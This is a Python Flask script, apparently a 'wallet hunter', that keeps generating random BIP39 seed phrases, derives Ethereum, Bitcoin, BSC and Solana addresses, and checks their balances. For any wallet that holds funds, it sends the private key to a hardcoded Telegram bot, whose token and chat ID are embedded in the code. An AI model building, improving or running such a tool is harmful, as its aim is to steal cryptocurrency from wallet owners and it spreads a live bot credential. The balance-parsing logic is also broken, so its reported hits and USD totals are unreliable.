import os
import threading
import random
import time
import requests
from flask import Flask, render_template_string, jsonify
from mnemonic import Mnemonic
from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes

app = Flask(__name__)

# Telegram sozlamalari
TG_TOKEN = "8481417913:AAH65jDSXYt8Z9CKOJW2VwxVG-nuanTe-FE"
CHAT_ID = "7521446360"

# Statistika
multi_hits = 0
multi_usd = 0
sol_hits = 0
sol_usd = 0

# HTML UI (Juda oddiy)
HTML = '''
<!doctype html>
<title>Wallet Scanner</title>
<h1 style="font-family:sans-serif">🧠 AI Wallet Hunter</h1>
<button onclick="fetch('/start_multi')">🚀 Start MultiCoin</button>
<button onclick="fetch('/start_sol')">🚀 Start Solana</button>
<h2>📊 Statistika:</h2>
<ul>
  <li>MultiCoin Topilgan: <span id="mh">0</span> | USD: <span id="mu">0</span></li>
  <li>Solana Topilgan: <span id="sh">0</span> | USD: <span id="su">0</span></li>
</ul>
<script>
setInterval(() => {
  fetch('/stats').then(r => r.json()).then(d => {
    document.getElementById('mh').innerText = d.multi_hits;
    document.getElementById('mu').innerText = d.multi_usd;
    document.getElementById('sh').innerText = d.sol_hits;
    document.getElementById('su').innerText = d.sol_usd;
  });
}, 2000);
</script>
'''

@app.route('/')
def index():
    return render_template_string(HTML)

@app.route('/start_multi')
def start_multi():
    threading.Thread(target=multi_coin_worker).start()
    return 'MultiCoin skaner boshlandi.'

@app.route('/start_sol')
def start_sol():
    threading.Thread(target=solana_worker).start()
    return 'Solana skaner boshlandi.'

@app.route('/stats')
def stats():
    return jsonify({
        "multi_hits": multi_hits,
        "multi_usd": multi_usd,
        "sol_hits": sol_hits,
        "sol_usd": sol_usd,
    })

def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": CHAT_ID, "text": msg})
    except: pass

def generate_mnemonic():
    return Mnemonic("english").generate(128)

def multi_coin_worker():
    global multi_hits, multi_usd
    coins = [
        (Bip44Coins.ETHEREUM, 'https://api.etherscan.io/api?module=account&action=balance&address={}&tag=latest&apikey=YourApiKeyToken'),
        (Bip44Coins.BITCOIN, 'https://blockchain.info/q/addressbalance/{}'),
        (Bip44Coins.BINANCE_CHAIN, 'https://api.bscscan.com/api?module=account&action=balance&address={}&apikey=YourApiKeyToken')
    ]
    while True:
        try:
            mnemonic = generate_mnemonic()
            seed = Bip39SeedGenerator(mnemonic).Generate()
            for coin, url_template in coins:
                wallet = Bip44.FromSeed(seed, coin).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
                address = wallet.PublicKey().ToAddress()
                priv = wallet.PrivateKey().ToWif() if coin == Bip44Coins.BITCOIN else wallet.PrivateKey().Raw().ToHex()
                url = url_template.format(address)
                balance = int(requests.get(url).text.split('"result":"')[-1].split('"')[0]) / 10**18
                if balance > 0.0001:
                    msg = f"🎯 {coin.Name()}\n🔑 {priv}\n📬 {address}\n💰 {balance:.6f}"
                    send_telegram(msg)
                    multi_hits += 1
                    multi_usd += balance * 1800
        except Exception as e:
            continue

def solana_worker():
    global sol_hits, sol_usd
    while True:
        try:
            mnemonic = generate_mnemonic()
            seed = Bip39SeedGenerator(mnemonic).Generate()
            wallet = Bip44.FromSeed(seed, Bip44Coins.SOLANA).Purpose().Coin().Account(0).Change(Bip44Changes.CHAIN_EXT).AddressIndex(0)
            address = wallet.PublicKey().ToAddress()
            priv = wallet.PrivateKey().Raw().ToHex()
            url = f"https://api.mainnet-beta.solana.com"
            headers = {"Content-Type": "application/json"}
            payload = {
                "jsonrpc":"2.0", "id":1, "method":"getBalance", "params":[address]
            }
            response = requests.post(url, json=payload, headers=headers).json()
            balance = response["result"]["value"] / 10**9
            if balance > 0.0001:
                msg = f"🌞 Solana\n🔑 {priv}\n📬 {address}\n💰 {balance:.6f} SOL"
                send_telegram(msg)
                sol_hits += 1
                sol_usd += balance * 140
        except Exception as e:
            continue

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
